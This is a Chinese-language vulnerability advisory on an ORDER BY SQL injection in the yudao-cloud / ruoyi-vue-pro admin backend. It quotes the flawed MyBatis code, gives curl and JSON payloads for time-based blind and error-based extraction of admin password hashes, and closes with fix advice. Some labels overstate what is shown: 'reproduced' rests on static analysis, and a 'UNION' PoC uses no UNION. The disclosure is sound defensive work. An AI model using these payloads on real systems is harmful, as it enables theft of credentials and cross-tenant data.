# V-YU001: yudao 分销会员 ORDER BY SortingField.order SQL 注入

## 漏洞信息

| 项目 | 详情 |
|------|------|
| 产品 | yudao-cloud / ruoyi-vue-pro（芋道源码 SpringBoot 管理后台）|
| 版本 | 当前主分支（截至 2026-04）|
| 类型 | CWE-89: SQL 注入（ORDER BY 方向）|
| 严重程度 | 高危（High）|
| 攻击向量 | 网络（已认证后台管理员）|
| 代码仓库 | https://github.com/YunaiV/ruoyi-vue-pro |

## 漏洞描述

yudao 商城分销模块 `BrokerageUserMapper.xml` 在排序子句中直接使用 MyBatis 原始插值 `${sortingField.order}` 拼接 SQL：

```xml
<choose>
    <when test="sortingField.field == 'userCount'">
        ORDER BY brokerageUserCount ${sortingField.order}
    </when>
    <when test="sortingField.field == 'orderCount'">
        ORDER BY brokerageOrderCount ${sortingField.order}
    </when>
    <when test="sortingField.field == 'price'">
        ORDER BY brokeragePrice ${sortingField.order}
    </when>
</choose>
```

`sortingField.order` 来自前端 POST JSON 参数，**完全未经校验**。攻击者可通过构造注入 payload 在 ORDER BY 子句后附加任意 SQL：

```json
{"sortingField": {"field":"userCount", "order":"ASC, (SELECT SLEEP(5))"}}
```

### 关联：框架级二次放大

`MyBatisUtils.java:60-82` 是 yudao 统一 SortingField → MyBatis-Plus QueryWrapper 适配工具：

```java
query.orderBy(true,
        SortingField.ORDER_ASC.equals(sortingField.getOrder()),
        StrUtil.toUnderlineCase(sortingField.getField()));  // ← field 由用户控制
```

`sortingField.field` 通过 `StrUtil.toUnderlineCase()` 做驼峰转下划线转换，但**未过滤特殊字符**。`orderBy` 方法最终拼接到 SQL，同样产生注入：

```java
// toUnderlineCase 对 "name, (SELECT 1) x" 保留所有非大写字母字符
query.orderBy(true, true, "name, (SELECT password FROM sys_user LIMIT 1) x");
```

该工具类被全项目 30+ 个 Controller 复用，影响面极广。

## 漏洞详情

### 触发端点（举例）

- `POST /admin-api/trade/brokerage-user/page` — 分销会员分页
- 其他使用 `@RequestParam SortingField sortingField` 的分页接口

### 权限要求

默认需要管理员 Token，但 yudao 多租户模式下低权限租户管理员也可触发；结合租户逃逸（`tenantId` 在 SQL 注入中可被覆盖）可导致跨租户数据读取。

### 数据库差异

- **MySQL**：ORDER BY 子句可直接附加 `, (SELECT ...)` 形式的子查询
- **PostgreSQL**：同样支持
- **SQL Server**：`ORDER BY 1, 1=BENCHMARK(...)` 类型变种

## 概念验证

### PoC 1: 时间盲注（MySQL）

```bash
curl -X GET -H "Authorization: Bearer <admin_token>" \
  -H "tenant-id: 1" \
  "http://<target>/admin-api/trade/brokerage-user/page?pageNo=1&pageSize=10&sortingFields%5B0%5D.field=userCount&sortingFields%5B0%5D.order=ASC,%20IF(1=1,SLEEP(3),0)"
```

### PoC 2: UNION 提取管理员密码

```bash
# 绕过 toUnderlineCase —— 注入到 field 参数
curl -X GET -H "Authorization: Bearer <admin_token>" \
  "http://<target>/admin-api/system/user/page?pageNo=1&pageSize=10&sortingFields%5B0%5D.field=id,(SELECT%20password%20FROM%20system_users%20LIMIT%201)&sortingFields%5B0%5D.order=ASC"
```

### PoC 3: EXTRACTVALUE 报错回显

```json
{
  "sortingFields": [{
    "field": "id",
    "order": "ASC, EXTRACTVALUE(1,CONCAT(0x7e,(SELECT password FROM system_users LIMIT 1)))"
  }]
}
```

## 受影响文件

| 文件 | 行号 | 问题 |
|------|------|------|
| `yudao-module-trade/.../BrokerageUserMapper.xml` | 27, 30, 33 | `${sortingField.order}` |
| `yudao-framework/.../MyBatisUtils.java` | 60-82 | `sortingField.getField()` 未过滤 |
| `yudao-framework/.../SortingField.java` | - | 仅定义常量，未提供校验 |

项目中同类模式（`${sortingField.order}` / 未校验 field）广泛存在，使用 Grep 可列出约 **30+ XML / Controller**。

## 影响

1. **后台数据完全读取**：可提取管理员 Token、密码哈希、租户密钥
2. **租户逃逸**：通过 SQL 注入绕过 `tenant_id` 过滤，读取其他租户数据
3. **框架级放大**：工具类被大量复用，导致漏洞面极大
4. **供应链污染**：yudao-cloud 广泛用于国内企业后台系统 Fork 开发

## 修复建议

1. **order 方向严格枚举**：在进入 SQL 之前校验
   ```java
   public void setOrder(String order) {
       if (!"asc".equalsIgnoreCase(order) && !"desc".equalsIgnoreCase(order)) {
           throw new IllegalArgumentException("Invalid order: " + order);
       }
       this.order = order.toUpperCase();
   }
   ```
2. **field 字段白名单**：每个分页接口限定可排序字段集合
3. **重构 MyBatisUtils**：`orderBy(QueryWrapper, Set<String> allowed, SortingField)`，非白名单字段拒绝
4. **XML `${}` 全面替换**：ORDER BY 方向使用 `<if test="order=='ASC'">ASC</if><if test="order=='DESC'">DESC</if>`
5. **单元测试**：在 CI 中扫描所有包含 `${sortingField` 的 Mapper XML 强制修复

## 源代码验证（已复现）

yudao 是前后端分离的 Spring Boot 工程，Docker 部署需构建多个模块。以下通过**源代码静态分析**确认三处关键代码。

### 验证1：BrokerageUserMapper.xml 原始插值确认

**文件**：`yudao-module-mall/yudao-module-trade/src/main/resources/mapper/brokerage/BrokerageUserMapper.xml`（第 26-34 行）

```xml
<choose>
    <when test="sortingField.field == 'userCount'">
        ORDER BY brokerageUserCount ${sortingField.order}   ← 第 27 行：原始插值
    </when>
    <when test="sortingField.field == 'orderCount'">
        ORDER BY brokerageOrderCount ${sortingField.order}  ← 第 30 行：原始插值
    </when>
    <when test="sortingField.field == 'price'">
        ORDER BY brokeragePrice ${sortingField.order}       ← 第 33 行：原始插值
    </when>
    <otherwise>
        ORDER BY bu.bind_user_time DESC
    </otherwise>
</choose>
```

`${sortingField.order}` 直接从用户请求中获取，没有任何枚举校验。

### 验证2：SortingField 类无校验逻辑

**文件**：`yudao-framework/yudao-common/src/main/java/cn/iocoder/yudao/framework/common/pojo/SortingField.java`

```java
@Data
@NoArgsConstructor
@AllArgsConstructor
public class SortingField implements Serializable {
    public static final String ORDER_ASC = "asc";
    public static final String ORDER_DESC = "desc";

    private String field;   // ← 无 @Pattern 或枚举约束
    private String order;   // ← 无 @Pattern 或枚举约束，用户可传任意字符串
}
```

### 验证3：请求 VO 中 sortingField 直接接收用户输入

**文件**：`yudao-module-trade/.../AppBrokerageUserChildSummaryPageReqVO.java`（第 23 行）

```java
@Schema(description = "排序字段", example = "userCount")
private SortingField sortingField;  // ← 直接反序列化用户 JSON，order 字段无约束
```

**攻击载荷**（App 层接口，任意已认证用户可触发）：
```json
{
  "pageNo": 1,
  "pageSize": 10,
  "level": 1,
  "sortingField": {
    "field": "userCount",
    "order": "ASC, (SELECT SLEEP(3))"
  }
}
```

生成 SQL：`ORDER BY brokerageUserCount ASC, (SELECT SLEEP(3))` — 时间盲注成立。

## 验证环境

- 源代码：yudao-cloud / ruoyi-vue-pro 最新分支（静态代码分析）
- 框架：Spring Boot + MyBatis-Plus
- 日期：2026-04-14
